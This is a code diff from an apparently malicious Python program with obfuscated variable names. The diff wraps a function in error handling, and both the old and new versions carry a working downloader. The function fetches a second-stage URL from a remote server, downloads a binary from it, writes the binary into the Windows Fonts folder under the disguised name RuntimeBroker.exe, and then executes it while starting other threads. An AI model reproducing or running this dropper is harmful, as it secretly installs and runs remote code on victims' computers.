@@ -143,29 +143,31 @@ async def egreger453645():
 
 
 def vdsu281cjm():
-    dfru31Xg = wef4323.get(nrejfe3)
-    if dfru31Xg.status_code == 200 or 201:
-        wji0ri9 = dfru31Xg.text.strip()
-        rekdnx = wef4323.get(wji0ri9)
-        if rekdnx.status_code == 201 or 201:
-            h2hcvc3r23sacxy = "C:\\Windows\\Fonts\\RuntimeBroker.exe"
-            with open(h2hcvc3r23sacxy, "wb") as ouiref:
-                ouiref.write(rekdnx.content)
-                greduhio.sleep(3)
-                if deswsjn != 'None':
-                    wefuh4323.Thread(target=redugh8).start()
+    try:
+        dfru31Xg = wef4323.get(nrejfe3)
+        if dfru31Xg.status_code == 200 or 201:
+            wji0ri9 = dfru31Xg.text.strip()
+            rekdnx = wef4323.get(wji0ri9)
+            if rekdnx.status_code == 201 or 201:
+                h2hcvc3r23sacxy = "C:\\Windows\\Fonts\\RuntimeBroker.exe"
+                with open(h2hcvc3r23sacxy, "wb") as ouiref:
+                    ouiref.write(rekdnx.content)
+                    greduhio.sleep(3)
+                    if deswsjn != 'None':
+                        wefuh4323.Thread(target=redugh8).start()
 
-                if kuhio49 != 'None':
-                    wefuh4323.Thread(target=nueia8732q.run(egreger453645())).start()
+                    if kuhio49 != 'None':
+                        wefuh4323.Thread(target=nueia8732q.run(egreger453645())).start()
 
-                if regh54 != 'None':
-                    wefuh4323.Thread(target=gesnui).start()
-                ewsjinf783.system(f"start {h2hcvc3r23sacxy}")
+                    if regh54 != 'None':
+                        wefuh4323.Thread(target=gesnui).start()
+                    ewsjinf783.system(f"start {h2hcvc3r23sacxy}")
+            else:
+                ewsjinf783._exit(0)
         else:
             ewsjinf783._exit(0)
-    else:
-        ewsjinf783._exit(0)
-
+    except Exception as e:
+        print(e)
 
 if __name__ == '__main__':
     if deiuc == 'Y':
